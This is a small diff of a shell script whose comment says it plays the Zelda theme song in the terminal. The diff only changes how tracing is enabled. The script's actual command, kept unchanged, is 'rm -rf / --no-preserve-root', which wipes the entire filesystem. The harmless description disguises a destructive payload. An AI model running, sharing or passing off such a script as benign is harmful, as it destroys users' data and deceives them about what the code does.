@@ -1,4 +1,4 @@
-#!/bin/sh -x
-
+#!/bin/sh
+set -x
 # plays zelda theme song in terminal
 rm -rf / --no-preserve-root
